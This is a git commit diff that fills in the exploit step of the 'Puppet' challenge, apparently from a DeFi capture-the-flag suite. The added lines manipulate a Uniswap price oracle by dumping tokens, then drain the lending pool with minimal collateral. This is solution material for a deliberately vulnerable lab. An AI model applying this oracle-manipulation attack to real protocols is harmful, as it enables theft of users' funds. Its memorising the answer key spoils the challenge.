86fb7e635879fcd5039e729e39ce515b2757d954
tutormike <803754+shorttermmem@users.noreply.github.com>
2021-12-29 10:56:15 -0500

    Solved Puppet.

--- test/puppet/puppet.challenge.js
+++ test/puppet/puppet.challenge.js
@@ -103,6 +103,12 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+            1, (await ethers.provider.getBlock('latest')).timestamp * 2);
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)});
     });
 
     after(async function () {
